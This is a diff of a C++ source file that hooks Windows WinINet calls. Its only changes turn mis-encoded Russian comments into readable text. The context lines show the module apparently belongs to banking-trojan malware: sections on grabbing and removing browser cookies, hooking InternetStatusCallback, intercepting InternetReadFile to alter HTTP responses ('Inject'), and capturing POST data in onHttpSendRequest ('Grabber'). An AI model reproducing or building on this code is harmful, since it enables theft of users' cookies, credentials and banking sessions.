@@ -25,7 +25,7 @@
 #if(BO_WININET > 0)
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//Р’В Connection table.
+//В Connection table.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 typedef struct
@@ -50,11 +50,11 @@ static DWORD connectionsCount;
 static CRITICAL_SECTION connectionsCs;
 
 /*
-  РџРѕРёСЃРє СЃРѕРµРґРёРЅРµРЅРµРЅРёСЏ РІ С‚Р°Р±Р»РёС†Рµ.
+  Поиск соединенения в таблице.
 
-  IN handle - С…СЌРЅРґР».
+  IN handle - хэндл.
 
-  Return    - РёРЅРґРµРєСЃ СЃРѕРµРґРёРЅРµРЅРёСЏ РІ С‚Р°Р±Р»РёС†Рµ, РёР»Рё (DWORD)-1 РµСЃР»Рё РЅРµ РЅР°Р№РґРµРЅРѕ.
+  Return    - индекс соединения в таблице, или (DWORD)-1 если не найдено.
 */
 static DWORD connectionFind(HINTERNET handle)
 {
@@ -63,11 +63,11 @@ static DWORD connectionFind(HINTERNET handle)
 }
 
 /*
-  Р”РѕР±Р°РІР»РµРЅРёРµ СЃРѕРµРґРёРЅРµРЅРёСЏ РІ С‚Р°Р±Р»РёС†Сѓ.
+  Добавление соединения в таблицу.
 
-  IN handle - С…СЌРЅРґР».
+  IN handle - хэндл.
 
-  Return    - РёРЅРґРµРєСЃ СЃРѕРµРґРёРЅРµРЅРёСЏ РІ С‚Р°Р±Р»РёС†Рµ, РёР»Рё (DWORD)-1 РµСЃР»Рё РЅРµ РЅР°Р№РґРµРЅРѕ.
+  Return    - индекс соединения в таблице, или (DWORD)-1 если не найдено.
 */
 static DWORD connectionAdd(HINTERNET handle)
 {
@@ -108,11 +108,11 @@ static DWORD connectionAdd(HINTERNET handle)
 }
 
 /*
-  РџРѕРёСЃРє СЃРѕРµРґРёРЅРµРЅРµРЅРёСЏ РІ С‚Р°Р±Р»РёС†Рµ, Рё РµРіРѕ РґРѕР±Р°РІР»РµРЅРёРµ РІ СЃР»СѓС‡Р°Рё РѕС‚СЃСѓС‚РІРёСЏ.
+  Поиск соединенения в таблице, и его добавление в случаи отсутвия.
 
-  IN handle - С…СЌРЅРґР».
+  IN handle - хэндл.
 
-  Return    - РёРЅРґРµРєСЃ СЃРѕРµРґРёРЅРµРЅРёСЏ РІ С‚Р°Р±Р»РёС†Рµ, РёР»Рё (DWORD)-1 РµСЃР»Рё РЅРµ РЅР°Р№РґРµРЅРѕ.
+  Return    - индекс соединения в таблице, или (DWORD)-1 если не найдено.
 */
 static DWORD connectionFindEx(HINTERNET handle)
 {
@@ -122,9 +122,9 @@ static DWORD connectionFindEx(HINTERNET handle)
 }
 
 /*
-  РЈРґР°Р»РµРЅРёРµ СЃРѕРµРґРёРЅРµРЅРёСЏ РёР· С‚Р°Р±Р»РёС†С‹.
+  Удаление соединения из таблицы.
 
-  IN index - РёРЅРґРµРєСЃ СЃРѕРµРґРёРЅРµРЅРёСЏ.
+  IN index - индекс соединения.
 */
 static void connectionRemove(DWORD index)
 {
@@ -221,7 +221,7 @@ void WininetHook::uninit(void)
 }
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//Р’В Getting the cookies.
+//В Getting the cookies.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 enum
@@ -234,11 +234,11 @@ enum
 #define WININETCOOKIE_BUFFER_SIZE (sizeof(INTERNET_CACHE_ENTRY_INFOW) + INTERNET_MAX_URL_LENGTH * sizeof(WCHAR) + MAX_PATH * sizeof(WCHAR))
 
 /*
-  Р§С‚РµРЅРёРµ РєСѓРєР° Wininet РёР· С„Р°Р№Р»Р°.
+  Чтение кука Wininet из файла.
 
-  IN fileName - РёРјСЏ С„Р°Р№Р»Р°.
+  IN fileName - имя файла.
 
-  Return      - РґР°РЅРЅС‹Рµ РєСѓРєР°(СѓРґР°Р»РёС‚ С‡РµСЂРµР· Mem), РёР»Рё NULL - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
+  Return      - данные кука(удалит через Mem), или NULL - в случаи ошибки.
 */
 static LPSTR __inline parseWininetCookies(LPWSTR fileName)
 {
@@ -306,7 +306,7 @@ typedef struct
 }WININETCOOKIESPROCFINDDATA;
 
 /*
-  РљСЌР»Р±СЌРє Fs::_findFiles().
+  Кэлбэк Fs::_findFiles().
 */
 static bool wininetCookiesFindProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
 {
@@ -339,11 +339,11 @@ static bool wininetCookiesFindProc(const LPWSTR path, const WIN32_FIND_DATAW *fi
 }
 
 /*
-  РћР±СЂР°Р±РѕС‚РєР° РєСѓРєРѕРІ Wininet.
+  Обработка куков Wininet.
 
-  IN flags     - С„Р»Р°РіРё COOKIESFLAG_*.
-  OUT list     - РїРѕР»РЅС‹Р№ СЃРїРёСЃРѕРє РєСѓРєРѕРІ.
-  OUT listSize - СЂР°Р·РјРµСЂ СЃРїРёСЃРєР° РєСѓРєРѕРІ.
+  IN flags     - флаги COOKIESFLAG_*.
+  OUT list     - полный список куков.
+  OUT listSize - размер списка куков.
 */
 static void wininetCookiesProc(DWORD flags, LPSTR *list, LPDWORD listSize)
 {
@@ -400,14 +400,14 @@ void WininetHook::_removeCookies(void)
 }
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//Р’В Inject.
+//В Inject.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  РЈСЃС‚Р°РЅРѕРІРєР° С…СѓРєР° РЅР° InternetStatusCallback РґР»СЏ С…СЌРЅРґР»Р° Рё РµРіРѕ СЂРѕРґРёС‚РµР»РµР№.
+  Установка хука на InternetStatusCallback для хэндла и его родителей.
 
   IN handle - HINTERNET.
-  IN hooker - С„СѓРЅРєС†РёСЏ-РїРµСЂРµС…РІР°С‚С‡РёРє СЃ РїСЂРѕС‚РѕС‚РёРїРѕРј InternetStatusCallbacks.
+  IN hooker - функция-перехватчик с прототипом InternetStatusCallbacks.
 */
 static void hookInternetStatusCallbacks(HINTERNET handle, void *hooker)
 {
@@ -436,7 +436,7 @@ static void hookInternetStatusCallbacks(HINTERNET handle, void *hooker)
 #define READCONTEXT_BUFFER_SIZE 4096 //Read buffer for readAllContext ().
 
 /*
-  РљСЌР»Р»Р±СЌРє РґР»СЏ readAllContext().
+  Кэллбэк для readAllContext().
 */
 static void CALLBACK readAllContextCallback(HINTERNET internet, DWORD_PTR context, DWORD internetStatus, LPVOID statusInformation, DWORD statusInformationLength)
 {
@@ -456,15 +456,15 @@ static void CALLBACK readAllContextCallback(HINTERNET internet, DWORD_PTR contex
 }
 
 /*
-  Р§С‚РµРЅРёРµ РІСЃРµРіРѕ РєРѕРЅС‚РµРєСЃС‚Р° РІ Р±СѓС„РµСЂ.
+  Чтение всего контекста в буфер.
 
-  IN request      - Р·Р°РїСЂРѕСЃ.
-  IN readEvent    - СЃРѕР±С‹С‚РёРµ Р°СЃСЃРѕС†РёРёСЂРѕРІР°РЅРѕРµ СЃ СЃРѕРµРґРёРЅРµРЅРёРµРј.
-  OUT context     - Р±СѓС„РµСЂ.
-  OUT contentSize - СЂР°Р·РјРµСЂ Р±СѓС„РµСЂР°.
+  IN request      - запрос.
+  IN readEvent    - событие ассоциированое с соединением.
+  OUT context     - буфер.
+  OUT contentSize - размер буфера.
 
-  Retrun          - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
-                    false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
+  Retrun          - true - в случаи успеха,
+                    false - в случаи ошибки.
 */
 static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context, LPDWORD contentSize)
 {
@@ -508,9 +508,9 @@ static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context,
         if(CWA(kernel32, GetLastError)() == ERROR_IO_PENDING)
         {
           /*
-            Р’РѕРѕР±С‰РµРј СЌС‚Рѕ РјРµСЃС‚Рѕ СЏРІР»СЏРµС‚СЃСЏ Р±РѕР»СЊРЅС‹Рј, С‚.Рє. РІ СЌС‚РѕС‚ РїСЂРµСѓРґ РїСЂРѕРіСЂР°РјРјР° СЌС‚Р°Р¶РѕРј РІС‹С€Рµ РїСЂРѕСЃС‚Рѕ
-            СЃР±РёРІР°РµС‚ РЅР°С€Сѓ readAllContextCallback(). Р РјС‹ РЅРµ РєРѕРіРґР° РЅРµ РїРѕР»СѓС‡РµРј СЃРёРіРЅР°Р» РѕС‚ СЃРѕР±С‹С‚РёСЏ.
-            РќСѓР¶РЅРѕ РЅР°Р№С‚Рё СЃРїРѕСЃРѕР± РёР·Р±РІР°РёС‚СЊСЃСЏ РѕС‚ InternetSetStatusCallback().
+            Вообщем это место является больным, т.к. в этот преуд программа этажом выше просто
+            сбивает нашу readAllContextCallback(). И мы не когда не получем сигнал от события.
+            Нужно найти способ избваиться от InternetSetStatusCallback().
           */
           Sync::_waitForMultipleObjectsAndDispatchMessages(1, &readEvent, false, INFINITE);
           continue;
@@ -547,15 +547,15 @@ static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context,
 }
 
 /*
-  РћРїРµСЂР°С†РёРё РїСЂРѕРёР·РІРѕРґРёРјС‹Рµ РІ РјРѕРјРµРЅС‚ С‡С‚РµРЅРёСЏ HTTP-РѕС‚РІРµС‚Р°.
+  Операции производимые в момент чтения HTTP-ответа.
   
-  IN OUT request         - С…СЌРЅРґР» Р·Р°РїСЂРѕСЃР°.
-  OUT buffer             - Р±СѓС„РµСЂ РґР»СЏ СЃС‡РёС‚Р°РЅС‹С… РґР°РЅРЅС‹С…. NULL - РґР»СЏ РІРѕР·РІСЂР°С‚Р° РґРѕСЃС‚РїСѓРЅРѕРіРѕ СЂР°Р·РјРµСЂР°.
-  IN numberOfBytesToRead - СЂР°Р·РјРµСЂ Р±СѓС„РµСЂР°.
-  OUT numberOfBytesRead  - РєРѕР». РїСЂРѕС‡РёС‚Р°РЅС‹С… Р±Р°Р№С‚.
+  IN OUT request         - хэндл запроса.
+  OUT buffer             - буфер для считаных данных. NULL - для возврата достпуного размера.
+  IN numberOfBytesToRead - размер буфера.
+  OUT numberOfBytesRead  - кол. прочитаных байт.
 
-  Return                 - (-1) - РІС‹Р·РІР°С‚СЊ СЃС‚Р°РЅРґР°СЂС‚РЅСѓСЋ С„СѓРЅРєС†РёСЋ С‡С‚РµРЅРёСЏ.
-                           Р’ РґСЂСѓРіРѕРј СЃР»СѓС‡Р°Рё, РІРµСЂРЅСѓС‚СЊ РІРјРµСЃС‚Рѕ РІС‹Р·РѕРІР° СЃС‚Р°РЅРґР°СЂС‚РЅРѕР№ С„СѓРЅРєС†РёРё, СЌС‚Рѕ Р·РЅР°С‡РµРЅРёРµ.
+  Return                 - (-1) - вызвать стандартную функцию чтения.
+                           В другом случаи, вернуть вместо вызова стандартной функции, это значение.
 */
 static int onInternetReadFile(HINTERNET *request, void *buffer, DWORD numberOfBytesToRead, LPDWORD numberOfBytesRead)
 {
@@ -669,19 +669,19 @@ static int onInternetReadFile(HINTERNET *request, void *buffer, DWORD numberOfBy
 }
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//Р’В Grabber.
+//В Grabber.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Р—Р°РїРѕР»РЅРµРЅРёРµ HttpGrabber::REQUESTDATA.
+  Заполнение HttpGrabber::REQUESTDATA.
 
-  OUT requestData - СЃС‚СЂСѓРєС‚СѓСЂР°.
-  IN request      - С…СЌРЅРґР» С‚РµРєСѓС‰РµРіРѕ Р·Р°РїСЂРѕСЃР°.
-  IN postData     - POST-РґР°РЅРЅС‹Рµ.
-  IN postDataSize - СЂР°Р·РјРµСЂ POST-РґР°РЅРЅС‹С….
+  OUT requestData - структура.
+  IN request      - хэндл текущего запроса.
+  IN postData     - POST-данные.
+  IN postDataSize - размер POST-данных.
 
-  Return          - true - РІ СЃР»СѓС‡СѓРё СѓСЃРїРµС…Р°,
-                    false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
+  Return          - true - в случуи успеха,
+                    false - в случаи ошибки.
 */
 static bool fillRequestData(HttpGrabber::REQUESTDATA *requestData, HINTERNET request, const void *postData, DWORD postDataSize)
 {
@@ -759,14 +759,14 @@ static bool fillRequestData(HttpGrabber::REQUESTDATA *requestData, HINTERNET req
 }
 
 /*
-  РћРїРµСЂР°С†РёРё РїСЂРѕРёР·РІРѕРґРёРјС‹Рµ РІ РјРѕРјРµРЅС‚ РѕС‚РїСЂР°РІРєРё HTTP-Р·Р°РїСЂРѕСЃР°.
+  Операции производимые в момент отправки HTTP-запроса.
 
-  IN request          - Р·Р°РїСЂРѕСЃ.
-  IN OUT postData     - POST-РґР°РЅРЅС‹Рµ.
-  IN OUT postDataSize - СЂР°Р·РјРµСЂ postData.
+  IN request          - запрос.
+  IN OUT postData     - POST-данные.
+  IN OUT postDataSize - размер postData.
 
-  Return              - (-1) - РІС‹Р·РІР°С‚СЊ СЃС‚Р°РЅРґР°СЂС‚РЅСѓСЋ С„СѓРЅРєС†РёСЋ РѕС‚СЃС‹Р»РєРё Р·Р°РїСЂРѕСЃР°.
-                        Р’ РґСЂСѓРіРѕРј СЃР»СѓС‡Р°Рё, РІРµСЂРЅСѓС‚СЊ РІРјРµСЃС‚Рѕ РІС‹Р·РѕРІР° СЃС‚Р°РЅРґР°СЂС‚РЅРѕР№ С„СѓРЅРєС†РёРё, СЌС‚Рѕ Р·РЅР°С‡РµРЅРёРµ.
+  Return              - (-1) - вызвать стандартную функцию отсылки запроса.
+                        В другом случаи, вернуть вместо вызова стандартной функции, это значение.
 */
 static int onHttpSendRequest(HINTERNET request, void **postData, LPDWORD postDataSize)
 {
